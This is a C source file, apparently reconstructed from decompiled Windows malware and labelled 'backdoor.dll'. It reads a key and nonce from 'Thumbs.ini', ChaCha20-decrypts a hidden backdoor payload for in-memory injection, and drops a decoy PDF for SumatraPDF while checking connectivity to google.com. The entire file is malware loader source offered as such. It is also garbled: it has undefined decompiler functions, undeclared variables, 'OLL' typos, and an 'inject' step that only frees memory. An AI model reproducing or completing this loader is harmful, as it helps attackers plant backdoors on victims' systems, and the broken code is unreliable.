
// manual compile: x86_64-w64-mingw32-gcc -o backdoor.dll backdoor.c -lwindows

#include <Windows.h>

// Function to decrypt and inject the backdoor
void decryptAndInjectBackdoor(LPVOID v6, DWORD v4, BYTE* Buffer, BYTE* v11, DWORD v8) {
    // Decrypt the backdoor using ChaCha20
    sub_180001000(v9, Buffer, v11, v8);
    sub_1800011F0(v9, v4, v6);

    // Check if the decryption was successful
    if (v4) {
        // Initialize the ChaCha20 cipher
        sub_180001C70(v6);

        // Inject the decrypted backdoor
        LocalFree(v6);
        return 0LL;
    }
}

int main() {
    // Create a file handle for "Thumbs.ini" with read-only access
    HANDLE FileA = CreateFileA(FileName, 0x80000000, 1u, OLL, 3u, 0x80u, 0LL);
    v2 = FileA;

    // Check if the file was opened successfully
    if (FileA == (HANDLE)-1LL) {
        return 0xFFFFFFFFLL;
    }

    // Get the file size
    DWORD FileSize = GetFileSize(FileA, OLL);

    // Check if the file size is at least 44 bytes
    if (FileSize < 0x2C) {
        return 0xFFFFFFFFLL;
    }

    // Read the key (32 bytes) and nonce (12 bytes) from the file
    BYTE Buffer[32];
    DWORD NumberOfBytesRead;
    if (!ReadFile(v2, Buffer, 0x20u, &NumberOfBytesRead, OLL) || 
        NumberOfBytesRead != 32 || 
        !ReadFile(v2, v11, 0xCu, &NumberOfBytesRead, OLL) || 
        NumberOfBytesRead != 12) {
        CloseHandle(v2);
        return 0xFFFFFFFFLL;
    }

    // Calculate the backdoor size
    DWORD v4 = FileSize - 44;

    // Allocate memory for the backdoor
    LPVOID v5 = LocalAlloc(0x40u, v4 + 1);
    v6 = v5;

    // Check if the allocation was successful
    if (v5) {
        // Read the encrypted backdoor from the file
        if (ReadFile(v2, v5, v4, &NumberOfBytesRead, OLL) && NumberOfBytesRead == v4) {
            CloseHandle(v2);

            // Decrypt and inject the backdoor
            decryptAndInjectBackdoor(v6, v4, Buffer, v11, v8);
        }
    }

    // Create a temporary file path for the decrypted PDF
    WCHAR PathName[260];
    GetTempPathW(0x104u, PathName);
    GetTempFileNameW(PathName, OLL, 0, PathName);

    // Create the decrypted PDF file
    HANDLE v8 = CreateFileW(PathName, 0x40000000u, 2u, OLL, 2u, 0x80u, 0LL);
    if (v8 == (HANDLE)-1LL) {
        goto LABEL_48;
    }

    // Pass the decrypted PDF path to sumatraPDF
    v9 = *(WORD*)(v2 + 8);

    // Initialize the ChaCha20 cipher
    sub_18000B320((unsigned int)v34, (unsigned int)v47, (unsigned int)&v39, (unsigned int)&v29, 20);

    // Check if there is an internet connection to google.com
    if (InternetCheckConnectionW(L"http://www.google.com", 1u, 0)) {
        // Pass the decrypted PDF path to sumatraPDF
        v9 = *(WORD*)(v2 + 8);
    }

    // Create another temporary file path for the decrypted PDF
    GetTempPathW(0x104u, PathName);
    GetTempFileNameW(PathName, OLL, 0, PathName);

    // Create the decrypted PDF file
    v8 = CreateFileW(PathName, 0x40000000u, 2u, OLL, 2u, 0x80u, 0LL);
    if (v8 == (HANDLE)-1LL) {
        goto LABEL_49;
    }

    // Initialize the ChaCha20 cipher
    sub_18000B320((unsigned int)v36, (unsigned int)v49, (unsigned int)&v41, (unsigned int)&v32, 20);

    return 0;
}
